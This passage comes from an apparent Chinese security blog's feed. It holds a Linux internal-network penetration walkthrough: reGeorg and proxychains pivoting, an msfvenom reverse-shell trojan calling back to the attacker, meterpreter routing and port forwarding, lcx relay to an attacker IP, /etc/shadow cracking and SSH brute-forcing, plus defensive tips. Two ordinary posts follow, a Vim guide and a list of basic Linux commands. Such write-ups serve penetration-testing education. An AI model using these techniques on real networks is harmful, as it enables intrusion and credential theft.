<p>代理扫描同样可以分为tcp代理扫描、http代理扫描。</p>
<h5 id="http代理转发"><a href="#http代理转发" class="headerlink" title="http代理转发"></a>http代理转发</h5><p>如果目标服务器有web系统，可以使用Regeorg + proxychains。<br>工具下载：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">reGeorg</a>、<a href="https://github.com/rofl0r/proxychains-ng" target="_blank" rel="external">proxychains</a><br>将reGeorg的tunnel文件上传到肉鸡服务器到网站目录下，攻击机执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python reGeorgSocksProxy.py -p 2333 -u http://test.com/tunnel.php</div></pre></td></tr></table></figure></p>
<p>然后修改proxychains.conf 配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/proxychains.conf   （mac上在~/.proxychains/proxychains.conf ,没有则自己创建）</div></pre></td></tr></table></figure></p>
<p>在最后一行添加socks5 127.0.0.1 2333(与regeorg设置的端口相同)</p>
<p>最后在攻击机使用扫描工具时，可以在执行的命令前加proxhchains4, 比如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">proxychains4 nmap -sT -Pn -n 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>注：此方案适合攻击者与肉鸡服务器都在各自内网环境，攻击者可以访问到目标服务器的http服务，通过该http服务进行代理转发（速度较慢）.</p>
<h5 id="tcp代理转发"><a href="#tcp代理转发" class="headerlink" title="tcp代理转发"></a>tcp代理转发</h5><p>思路：通过metasploit木马反弹一个肉鸡的meterpreter shell到攻击机上，然后在meterpreter shell上设置路由，我们便可以在攻击机上直接扫描肉鸡所在的网段服务器（这里是可以跨网段扫描的）。</p>
<h6 id="生成msf木马"><a href="#生成msf木马" class="headerlink" title="生成msf木马"></a>生成msf木马</h6><p>生成木马：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=攻击机ip LPORT=8000 -f elf &gt; shell_8000.elf</div></pre></td></tr></table></figure></p>
<p>由于攻击机无法访问肉鸡的端口，而肉鸡可以访问攻击机的端口，因此生成一个反向的木马。</p>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><p>　　攻击机运行msfconsole，使用exoloit/multi/handler模块，set payload linux/x86/meterpreter/reverse_tcp跟生成木马时用的payload一样。LPORT设置成木马将要连接的端口，运行后会在攻击机上监听一个端口，等待木马链接。<br>　　此时将shell_8000.elf上传到肉鸡服务器上，添加权限后运行木马将会主动连接上攻击机监听的端口，并在攻击机上获取一个meterpreter shell。</p>
<h6 id="设置路由"><a href="#设置路由" class="headerlink" title="设置路由"></a>设置路由</h6><p>上一步获取到了一个session，这个session是攻击机与肉鸡相互连接的会话。<br>查看下肉鸡的网络情况：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run get_local_subnets</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/1.png" alt=""><br>添加路由:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute -s 192.168.16.0/24</div></pre></td></tr></table></figure></p>
<p>查看路由：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">run autoroute –p</div></pre></td></tr></table></figure></p>
<p><img src="/upload_image/20170809/2.png" alt=""><br>一般来说，这里设置好路由就可以了，但是有些时候会发现在meterpreter中有效果，但是在msf中失效了，因此可以在msf中再设置一次。（但前提是meterpreter会话要一直存在）将该会话放入后台，进入msf中添加路由。<br>查看路由：<br><img src="/upload_image/20170809/3.png" alt=""><br>这里已经是添加好的结果，添加路由命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msf exploit(handler) &gt; route add 192.168.16.0 255.255.255.0 12</div><div class="line">msf exploit(handler) &gt; route add 192.168.17.0 255.255.255.0 12</div></pre></td></tr></table></figure></p>
<p>注意：12表示session id，由于我们需要访问17网段，因此这里也要添加17网段的路由。</p>
<p>说明：以上2条路由的意思，是攻击机如果要去访问17或者16网段的资源，其下一跳是session12，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<p>转发连接原理：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">攻击机&lt;--&gt;meterpreter_shell（session）&lt;--&gt;肉鸡 <span class="comment"># 这里不是端口的概念，而是路由</span></div></pre></td></tr></table></figure></p>
<h5 id="tcp全局代理转发"><a href="#tcp全局代理转发" class="headerlink" title="tcp全局代理转发"></a>tcp全局代理转发</h5><p>　　通过以上设置，在msf中可以访问内网资源了，但也仅限在msf中可以访问。如果想要其他工具也能使用代理，则要设置全局代理，这需要使用msf框架中的socks4a工具代理，目录：auxiliary/server/socks4a，然后配合Proxychains ，使用方法跟http代理类似。</p>
<p>注：此代理不是http代理，是tcp代理，因此需要目标服务器或者攻击者服务器，有一方在外网的环境，不然木马端口无法连接，也就无法获取meterpreter shell。</p>
<p>metasploit操作可参考：<a href="https://thief.one/2017/08/01/1/">【渗透神器系列】Metasploit</a></p>
<h4 id="端口扫描工具"><a href="#端口扫描工具" class="headerlink" title="端口扫描工具"></a>端口扫描工具</h4><p>推荐使用metasploit进行tcp代理转发后，利用msf上面整合的很多扫描模块，直接进行扫描。<br>扫描模块：</p>
<ul>
<li>auxiliary/scanner/portscan　　端口扫描</li>
<li>scanner/portscan/syn　　SYN端口扫描</li>
<li>scanner/portscan/tcp　　TCP端口扫描<br>……</li>
</ul>
<p>除此之外，也可以使用nmap等扫描工具，结合tcp全局代理转发即可。</p>
<h3 id="针对22端口的入侵"><a href="#针对22端口的入侵" class="headerlink" title="针对22端口的入侵"></a>针对22端口的入侵</h3><p>　　扫描出内网服务器端口后，我们可以首先选择开放22端口的服务器进行入侵尝试。攻击22端口通常有2种方法，第一种是先读取肉鸡明文密码，再利用明文密码尝试登陆；第二种是字典暴力登陆。</p>
<h4 id="尝试hash破解"><a href="#尝试hash破解" class="headerlink" title="尝试hash破解"></a>尝试hash破解</h4><p>如果权限足够，我们可以顺利读取/etc/shadow文件的内容，然而是密文的，因此可以尝试用工具破解。</p>
<ul>
<li><a href="http://www.openwall.com/john/" target="_blank" rel="external">John破解hash</a></li>
<li><a href="https://github.com/hashcat/hashcat" target="_blank" rel="external">Hashcat</a></li>
</ul>
<p>注：windows下可以使用<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">mimikatz</a></p>
<p>说明：获取linux账号的明文密码作用很大，因为内网环境管理员可能就那么几个，不同服务器所设置的密码也有可能相同，因此可以使用获取的服务器密码去尝试登陆其余开放了22端口的内网服务器。</p>
<h4 id="字典暴力破解"><a href="#字典暴力破解" class="headerlink" title="字典暴力破解"></a>字典暴力破解</h4><p>这个没啥好说的，主要看字典是否强大，以及是否有防止爆破限制。<br>工具：</p>
<ul>
<li>hydra</li>
<li>msf上的相应模块</li>
</ul>
<h3 id="针对其他端口的入侵"><a href="#针对其他端口的入侵" class="headerlink" title="针对其他端口的入侵"></a>针对其他端口的入侵</h3><p>　　除了22端口外，21（ftp）、3306（mysql）、1433（mssql）等都可以通过暴力破解的方式。那么其他段端口呢？比如445、443等，这些则可以通过相应的漏洞进行攻击，通过可以使用nessus扫描器进行扫描，对发现的漏洞再集合msf上相应的模块进行攻击。</p>
<h3 id="针对web服务的入侵"><a href="#针对web服务的入侵" class="headerlink" title="针对web服务的入侵"></a>针对web服务的入侵</h3><p>　　除了以上的端口外，还有一类端口比较特殊，那就是web服务类的端口，比如80、443、8000+等。由于这些端口上存在web应用，而web应用又是容易存在漏洞的点。因此可以重点寻找内网中存在web服务的服务器，并依照web渗透测试的流程对其web应用进行渗透。</p>
<h3 id="端口转发的逆袭"><a href="#端口转发的逆袭" class="headerlink" title="端口转发的逆袭"></a>端口转发的逆袭</h3><p>　　前文介绍了端口转发技术，但在扫描环节中我并没有使用这种方案。那么是不是说端口转发在内网渗透中没有用武之地呢？<br>　　事实并不是这样，内网扫描过后的漏洞利用攻击阶段，才是端口转发真正的舞台。在此阶段，我们可以利用端口转发，将某个存在漏洞的服务器的某个端口转发出来，单独攻击利用。我们可以想到在windows中，利用lcx转发3389端口，linux下同样可以转发22端口，当然更好用的是转发80端口，达到可以本地访问内网的web服务，从而继续web渗透的套路，扩大攻击面。</p>
<h4 id="meterpreter实现端口转发"><a href="#meterpreter实现端口转发" class="headerlink" title="meterpreter实现端口转发"></a>meterpreter实现端口转发</h4><p>在meterpreter shell中输入：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; portfwd add -l 55555 -r 192.168.16.1 -p 3306</div></pre></td></tr></table></figure></p>
<p>说明：表示将192.168.16.1服务器上的3306端口转发到本地（攻击机）的55555端口，然后我们可以在本地运行mysql –h 127.0.0.1 –u root –P 55555 –p 去登陆内网服务器的mysql。其他端口如ssh、ftp等都类似，这个过程跟msf代理很像。</p>
<h5 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h5><p>将肉鸡的22端口转发到攻击机的2222端口，看一下连接情况。<br>发现攻击机上监听了2222端口，连接到了本机其外一个高端口。<br><img src="/upload_image/20170809/4.png" alt=""><br>肉鸡的22端口也连接到了肉鸡自己的一个高端口<br><img src="/upload_image/20170809/5.png" alt=""><br>那么两台服务器之间的两个高端口之间是怎么连接的，我想肯定是利用meterpreter会话。因此meterpreter会话就相当于一个中间人，传递原本无法传递的消息。</p>
<h4 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h4><p>攻击机:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -listen 2222 3333 <span class="comment"># 2222为转发端口，3333为本机任意未被占用的端口</span></div></pre></td></tr></table></figure></p>
<p>肉鸡：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lcx -slave 110.1.1.1 2222 127.0.0.1 3389</div></pre></td></tr></table></figure></p>
<p>110.1.1.1为攻击机外网ip，2222为转发端口，127.0.0.1为肉鸡内网ip，3389为远程终端端口 。</p>
<h3 id="内网嗅探"><a href="#内网嗅探" class="headerlink" title="内网嗅探"></a>内网嗅探</h3><p>　　windows下可以使用cain，linux下可以使用msf中的模块。当然一般情况下，最好不要用内网嗅探，因为动静太大，而且可能会影响内网网络。</p>
<h3 id="linux内网安全建议"><a href="#linux内网安全建议" class="headerlink" title="linux内网安全建议"></a>linux内网安全建议</h3><p>说了这么多内网渗透的套路，按惯例最后该给出内网安全建设的几点建议了，当然只是个人看法，可以一起留言讨论。</p>
<ul>
<li>每台服务器上安装监控软件，监控并拦截木马程序的运行（监控木马文件以及行为）</li>
<li>监控服务器上开启的新端口，查看其连接情况，是否有异常连接（监控异常端口）</li>
<li>服务器及时更新补丁，以及最新系统漏洞补丁（减少漏洞）</li>
<li>服务器上运行的应用给予低权限（增加提权的难度）</li>
<li>不必要连接外网的服务器，禁止连接外网（减少被入侵的风险）</li>
<li>日志记录并且实时监控（监控异常操作以及暴力破解行为）</li>
</ul>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="http://bobao.360.cn/learning/detail/4164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4164.html</a><br><a href="http://bobao.360.cn/learning/detail/3204.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3204.html</a><br><a href="http://www.freebuf.com/sectool/56432.html" target="_blank" rel="external">http://www.freebuf.com/sectool/56432.html</a><br><a href="http://www.freebuf.com/articles/network/125278.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/125278.html</a></p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/09/1/">【玩转linux系列】Vim使用</a><br><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;Nothing great was ever achieved without enthusiasm&lt;br&gt;无热情成就不了伟业&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　前段时间做了一次不算成功也不算完整的linux内网渗透，不算成功是因为并没有拿下内网中其他服务器的权限，不算完整是因为由于某些原因测试被迫暂时中止。虽然这次linux内网渗透不算是一个很好的教学案例，但我还是决定把过程记录一下，尤其重点记录linux内网渗透的思路，以防遗忘。&lt;br&gt;
    
    </summary>
    
      <category term="系统安全" scheme="http://thief.one/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="内网渗透" scheme="http://thief.one/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【玩转linux系列】Vim使用</title>
    <link href="http://thief.one/2017/08/09/1/"/>
    <id>http://thief.one/2017/08/09/1/</id>
    <published>2017-08-09T07:53:58.000Z</published>
    <updated>2017-08-31T06:53:46.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">The secret of success is constancy of purpose<br>成功的秘诀在于持之于恒<br></blockquote><br>　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。<br><a id="more"></a><br><img src="/upload_image/20170809/6.png" alt=""></p>
<h3 id="复制剪切粘贴"><a href="#复制剪切粘贴" class="headerlink" title="复制剪切粘贴"></a>复制剪切粘贴</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yy  <span class="comment"># 复制一行</span></div><div class="line">dd  <span class="comment"># 剪切一行</span></div><div class="line">p   <span class="comment"># 粘贴</span></div></pre></td></tr></table></figure>
<h3 id="查找单词"><a href="#查找单词" class="headerlink" title="查找单词"></a>查找单词</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:/nmask <span class="comment"># 查找存在nmask字符串的位置</span></div><div class="line">或者</div><div class="line">bin/bash&gt;:?nmask <span class="comment"># 查找存在nmask字符串的位置</span></div></pre></td></tr></table></figure>
<p>继续查找下一个存在nmask字符串的位置</p>
<ul>
<li>n 往上查找</li>
<li>N 往下查找</li>
</ul>
<h3 id="编辑器显示设置"><a href="#编辑器显示设置" class="headerlink" title="编辑器显示设置"></a>编辑器显示设置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">:<span class="built_in">set</span> nu!        <span class="comment"># 显示行号</span></div><div class="line">:<span class="built_in">set</span> autoindent <span class="comment"># 自动缩进</span></div><div class="line">:syntax <span class="built_in">enable</span>  <span class="comment"># 语法高亮</span></div></pre></td></tr></table></figure>
<h3 id="文件内容定位"><a href="#文件内容定位" class="headerlink" title="文件内容定位"></a>文件内容定位</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">gg              <span class="comment"># 首行</span></div><div class="line">G               <span class="comment"># 末行</span></div><div class="line">XG              <span class="comment"># 定位到第X行</span></div><div class="line">或者：</div><div class="line">bin/bash&gt;：10   <span class="comment"># 定位到第10行</span></div></pre></td></tr></table></figure>
<h3 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">o <span class="comment"># 在当前行下插入一行</span></div></pre></td></tr></table></figure>
<h3 id="保存退出"><a href="#保存退出" class="headerlink" title="保存退出"></a>保存退出</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ZZ <span class="comment"># 保存退出</span></div><div class="line">ZQ <span class="comment"># 不保存退出</span></div><div class="line">bin/bash&gt;：w　filename   <span class="comment"># 另存为</span></div></pre></td></tr></table></figure>
<h3 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bin/bash&gt;:％s/regexp/replacement/g   <span class="comment"># 文本中所有匹配的都替换</span></div></pre></td></tr></table></figure>
<h3 id="行内移动"><a href="#行内移动" class="headerlink" title="行内移动"></a>行内移动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">（  <span class="comment"># 移动到句首</span></div><div class="line">）  <span class="comment"># 移动到句尾</span></div></pre></td></tr></table></figure>
<h3 id="vim保存没有权限的文件"><a href="#vim保存没有权限的文件" class="headerlink" title="vim保存没有权限的文件"></a>vim保存没有权限的文件</h3><h4 id="文件只读"><a href="#文件只读" class="headerlink" title="文件只读"></a>文件只读</h4><p>使用:w!强制写入<br>或者:set noreadonly然后只要使用正常的:w</p>
<h4 id="不能写，但有sudo权限。"><a href="#不能写，但有sudo权限。" class="headerlink" title="不能写，但有sudo权限。"></a>不能写，但有sudo权限。</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">:w !sudo tee %</div></pre></td></tr></table></figure>
<p>这是一个接收管道信息并可以写入文件的命令。</p>
<h4 id="无权写入该文件，没有管理员权限sudo"><a href="#无权写入该文件，没有管理员权限sudo" class="headerlink" title="无权写入该文件，没有管理员权限sudo"></a>无权写入该文件，没有管理员权限sudo</h4><p>使用:w! ~/tempfile.ext将更改写入临时文件，然后采取措施将临时文件移动到目录(将临时文件发送到目录所有者/管理员)。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p><a href="https://thief.one/2017/08/08/1/">【玩转linux系列】Linux基础命令</a><br><a href="https://thief.one/2017/08/09/2/">【玩转linux系统】Linux内网渗透</a><br><a href="https://thief.one/2017/08/11/1/">【玩转linux系列】shell编程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;The secret of success is constancy of purpose&lt;br&gt;成功的秘诀在于持之于恒&lt;br&gt;&lt;/blockquote&gt;&lt;br&gt;　　工作中有时需要在linux服务器上写代码，然而习惯了sublime，突然切换到linux下的vim感觉很不习惯，编程效率自然下降了很多。但这并不是说vim编辑器本身效率低下，而是我并没有发挥出它强大的功能（据说大神都是用vim），为了能加快编程的效率，简单学习总结下vim的用法。&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="http://thief.one/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="linux" scheme="http://thief.one/tags/linux/"/>
    
      <category term="vim" scheme="http://thief.one/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>【玩转Linux系列】Linux基础命令</title>
    <link href="http://thief.one/2017/08/08/1/"/>
    <id>http://thief.one/2017/08/08/1/</id>
    <published>2017-08-08T12:21:20.000Z</published>
    <updated>2017-08-31T06:14:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">即使跌倒了，你要懂得抓一把沙子在手里。<br></blockquote><br>　　随着对安全技术探索的逐步深入，我深刻体会到掌握linux系统对于安全研究的重要性。而掌握Linux系统首先必须得学会一些常用的linux命令，其次再去掌握一些linux常用工具，最后再是深入理解linux系统内核等。因此本篇作为该系列的第一篇，主要用来记录分享一些自己常用且基础的Linux命令。<br><a id="more"></a></p>
<h3 id="命令帮助"><a href="#命令帮助" class="headerlink" title="命令帮助"></a>命令帮助</h3><h4 id="解析命令的意思-whatis、info"><a href="#解析命令的意思-whatis、info" class="headerlink" title="解析命令的意思(whatis、info)"></a>解析命令的意思(whatis、info)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">whatis whoami 解析命令的意思</div><div class="line">info whoami   详细解析命令的意思</div></pre></td></tr></table></figure>
<h4 id="寻找命令的安装路径-which、whereis"><a href="#寻找命令的安装路径-which、whereis" class="headerlink" title="寻找命令的安装路径(which、whereis)"></a>寻找命令的安装路径(which、whereis)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">which</span> whoami  寻找命令的位置</div><div class="line">whereis whoami 寻找程序的位置</div></pre></td></tr></table></figure>
<h3 id="目录管理"><a href="#目录管理" class="headerlink" title="目录管理"></a>目录管理</h3><h4 id="目录查看-ls"><a href="#目录查看-ls" class="headerlink" title="目录查看(ls)"></a>目录查看(ls)</h4><p>查看目录结构<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tree</div></pre></td></tr></table></figure></p>
<p>查看当前目录下所有子文件夹排序后的大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh `ls` | sort</div></pre></td></tr></table></figure></p>
<p>查看目录下文件个数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ | wc -l</div></pre></td></tr></table></figure></p>
<p>按时间排序，以列表的方式显示目录项<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls -lrt</div></pre></td></tr></table></figure></p>
<p>给每项文件前面增加一个id编号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ls | cat -n</div></pre></td></tr></table></figure></p>
<h4 id="文件目录权限-chmod、chown"><a href="#文件目录权限-chmod、chown" class="headerlink" title="文件目录权限(chmod、chown)"></a>文件目录权限(chmod、chown)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">改变文件的拥有者 chown</div><div class="line">改变文件读、写、执行等属性 chmod</div><div class="line">递归子目录修改： chown -R tuxapp <span class="built_in">source</span>/</div><div class="line">增加脚本可执行权限： chmod a+x myscript</div></pre></td></tr></table></figure>
<h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="文件创建删除-touch、echo、rm-f"><a href="#文件创建删除-touch、echo、rm-f" class="headerlink" title="文件创建删除(touch、echo、rm -f)"></a>文件创建删除(touch、echo、rm -f)</h4><p>删除日志文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rm *<span class="built_in">log</span> (等价: <span class="variable">$find</span> ./ -name “*<span class="built_in">log</span>” -<span class="built_in">exec</span> rm &#123;&#125; ;)</div></pre></td></tr></table></figure></p>
<h4 id="文件查看-du-sh"><a href="#文件查看-du-sh" class="headerlink" title="文件查看(du -sh)"></a>文件查看(du -sh)</h4><p>查看文件大小<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">du -sh  文件名</div></pre></td></tr></table></figure></p>
<p>统计文件行数<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wc -l test.txt</div></pre></td></tr></table></figure></p>
<h4 id="文件内容查看-cat、head、tail"><a href="#文件内容查看-cat、head、tail" class="headerlink" title="文件内容查看(cat、head、tail)"></a>文件内容查看(cat、head、tail)</h4><p>显示时同时显示行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat -n  （如：cat test.txt | cat -n）</div></pre></td></tr></table></figure></p>
<p>正向逆向查看文件内容<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">head -1 filename <span class="comment"># 第1行内容</span></div><div class="line">tail -5 filename <span class="comment"># 倒数5行内容</span></div></pre></td></tr></table></figure></p>
<h4 id="文件搜索-find"><a href="#文件搜索-find" class="headerlink" title="文件搜索(find)"></a>文件搜索(find)</h4><p>linux 复制特定后缀文件（保持目录结构）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar cvf my_txt_files.tar `find . -<span class="built_in">type</span> f -name <span class="string">"*.jsp*"</span>`</div></pre></td></tr></table></figure></p>
<p>递归当前目录及子目录并删除所有.log文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find ./ -name <span class="string">"*.log"</span> -<span class="built_in">exec</span> rm &#123;&#125; \;</div></pre></td></tr></table></figure></p>
<p>否定参数查找所有非txt文本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . ! -name <span class="string">"*.txt"</span> -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<p>按类型搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -<span class="built_in">type</span> d -<span class="built_in">print</span>  //只列出所有目录</div></pre></td></tr></table></figure></p>
<p>最近7天内被访问过的所有文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">find . -atime -7 -<span class="built_in">type</span> f -<span class="built_in">print</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容搜索-grep"><a href="#文件内容搜索-grep" class="headerlink" title="文件内容搜索(grep)"></a>文件内容搜索(grep)</h4><p>查看成功登陆ssh的IP地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">centos</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/secure* | grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div><div class="line"></div><div class="line">ubuntu：</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `grep <span class="string">'sshd'</span> /var/<span class="built_in">log</span>/auth.log* |grep <span class="string">'Accepted'</span> |grep ftp| grep -oE  <span class="string">'\&lt;([1-9]|[1-9][0-9]|1[0-9]&#123;2&#125;|2[01][0-9]|22[0-3])\&gt;(\.\&lt;([0-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\&gt;)&#123;2&#125;\.\&lt;([1-9]|[0-9][0-9]|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-4])\&gt;'</span> | sort  | uniq`; <span class="keyword">do</span> curl  -s --header <span class="string">"X-Forwarded-For: <span class="variable">$i</span>"</span> http://1212.ip138.com/ic.asp |iconv -c -f GB2312 -t utf-8 | grep -o -P <span class="string">'(?&lt;=\&lt;center\&gt;您的IP是：).*(?=&lt;\/center)'</span> ; <span class="keyword">done</span></div></pre></td></tr></table></figure></p>
<p>递归目录搜索返回文本内容存在class字符串的行号<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">grep <span class="string">"class"</span> . -R -n</div></pre></td></tr></table></figure></p>
<p>非匹配(-v)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep -v <span class="string">"python"</span>  <span class="comment">#匹配除了python进程</span></div></pre></td></tr></table></figure></p>
<h4 id="文件内容排序-sort"><a href="#文件内容排序-sort" class="headerlink" title="文件内容排序(sort)"></a>文件内容排序(sort)</h4><ul>
<li>-n 按数字进行排序 VS -d 按字典序进行排序</li>
<li>-r 逆序排序</li>
<li>-k N 指定按第N列排序</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sort -nrk 1 data.txt</div><div class="line">sort -bd data // 忽略像空格之类的前导空白字符</div></pre></td></tr></table></figure>
